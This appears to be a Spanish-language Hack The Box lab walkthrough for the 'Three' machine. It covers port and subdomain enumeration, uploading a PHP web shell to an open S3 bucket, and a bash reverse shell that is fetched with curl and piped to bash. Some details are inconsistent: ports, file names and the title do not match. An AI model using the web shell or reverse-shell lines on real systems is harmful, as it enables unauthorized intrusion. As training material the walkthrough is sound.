---
title: Three HTB walkthrough
published: false
---

# Responder HTB walkthrough

En este artículo trataremos la resolucion de la máquina Trhree de Hack the Box.

## Fase de reconocimiento

Comenzamos lanzando un ping para comprobar que la máquina se encuentra activa. En base al ttl comenzamos a sospechar que se trata de una máquina linux. A continuación lanzamos nmap en busca de puertos abiertos, utilizando parámetros que aceleren la busqueda:

```bsh
$sudo nmap -p- --open -sS --min-rate 5000 -n -Pn <ip>
```

Obteniendo:

```bsh
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Sospechamos que se trata de una página web, así que la inspeccionamos.

### Reconocimiento de la página web

En la página web no se aprecia nada sospechoso, es una simple página estática. Analizamos con *whatweb*:

```s
$whatweb 10.129.204.158
http://10.129.204.158 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[mail@thetoppers.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.204.158], Script, Title[The Toppers]
```

Tanto en whatweb como el la propia página, en la sección de *contacto*, podemos identificar el dominio *thetoppers.htb*. Tras añadirlo al */etc/hosts*, podríamos tratar de enumerar posibles subdominios, utilizando gobuster:

```s
$sudo gobuster vhost -w subdomains-top1million-5000.txt -u http://thetoppers.htb
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://thetoppers.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/02/02 11:07:50 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb Status: 404 [Size: 21]
Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]

```

Obteniendo que existe un subdominio *s3.thetoppers.htb*. Si hacemos una búsqueda rápida de algo como *"s3 subdomain status running"*, comprobaremos que se trata de un servicio de almacenamiento en la nube que nos permite almacenar objetos en contenedores llamados *buckets*.

## Interactuando con el bucket s3

Para interactuar con este servicio utilizaremos una utilidad llamada *awscli*. La instalamos con `$sudo apt install awscli`. Además, antes de utilizarla debemos configurarla, porque aunque en ocasiones el servicio no requiera utenticación, la utilidad requiere tener algún valor para funcionar:

```s
$aws configure
aws configure
AWS Access Key ID [None]: temp 
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

Ahora ya podemos tratar de listar el contenido del bucket:

```
$aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2023-02-02 09:14:10          0 .htaccess
2023-02-02 09:14:11      11952 index.php
```

Vemos un par de archivos (*index.php* y *.htaccess*) y el directorio *images*, lo que nos da a entender que podría ser la raíz del sitio web. *awslci* también nos permite copiar archivos a un bucket, por lo que podríamos intentar subir una shell al servidor. Antes vimos mediante whatweb que la página estaba escrita en php, por lo que utilizaremos el siguiente one-liner:

```php
<?php system($_GET["cmd"]); ?>
```

Lo guardamos en un fichero .php:

```s
$echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Y la subimos con:

```s
$aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

Y ya tendríamos la posibilidad de ejecución remota de comandos pasados como parámetros de la url. Por ejemplo:

```
http://thetoppers.htb/shell.php?cmd=id
```

Que devolvería:

```powershell
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Obteniendo una reverse shell

En este punto, podríamos tratar de conseguir que la máquina víctima se conectara de vuelta a nuestra máquina, otorgándonos una reverse shell. Para ello, creamos el siguiente fichero en bash:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
```

y nos quedamos en escucha mediante netcat por el puerto 443:

```s
nc -nvlp 1337
```

Además, crearemos en otra pestaña un servidor http con python en el puerto 8000:

```python
python3 -m http.server 8080
```

De esta forma, podemos desde el servidor buscar nuestra reverse shell conectádonos a nuestro equipo por el servidor http, para posteriormente pipear a bash para que se ejecute, entablando la conexión por el puerto 443:

```
http://thetoppers.htb/reverse_shell.php?cmd=curl%20<your_ip>:8080/reverseshell.sh|bash
```

Y una vez dentro, la flag está en /var/www/, enhorabuena, has conseguido la flag!